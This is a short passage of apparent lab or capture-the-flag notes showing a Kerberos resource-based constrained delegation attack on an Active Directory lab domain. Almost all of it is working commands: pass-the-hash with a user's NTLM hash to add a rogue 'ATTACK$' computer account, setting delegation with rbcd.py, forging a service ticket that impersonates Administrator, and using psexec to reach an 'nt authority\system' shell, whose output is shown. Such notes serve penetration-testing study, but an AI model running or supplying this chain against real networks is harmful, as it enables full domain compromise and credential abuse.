-  L\.Livingstone@resourced\.local \-\-\-\-\-\-\-\-\-\-\> resourcedc\.resourced\.local
\( This means Kerberos Resourced Based Constraint Delegation attack is possible which allows to impersonal a user \(admin\)

-  create a new machine 

-  impacket\-addcomputer resourced\.local/L\.Livingstone \-dc\-ip 192\.168\.190\.175 \-hashes ':19a3a7550ce8c505c2d46b5e39d6f808' \-computer\-name 'ATTACK$' \-computer\-pass 'Attacker\!'
-  python rbcd\.py \-dc\-ip 192\.168\.190\.175 \-t RESOURCEDC \-f 'ATTACK' \-hashes ':19a3a7550ce8c505c2d46b5e39d6f808' resourced\\\\L\.Livingstone
-  impacket\-getST \-spn cifs/resourcedc\.resourced\.local resourced/attack\\$:'Attacker\!' \-impersonate Administrator \-dc\-ip 192\.168\.190\.175
-  export KRB5CCNAME=\./Administrator\.ccache
-  impacket\-psexec \-k \-no\-pass resourcedc\.resourced\.local \-dc\-ip 192\.168\.190\.175
C:\\Windows\\system32\> whoami
nt authority\\system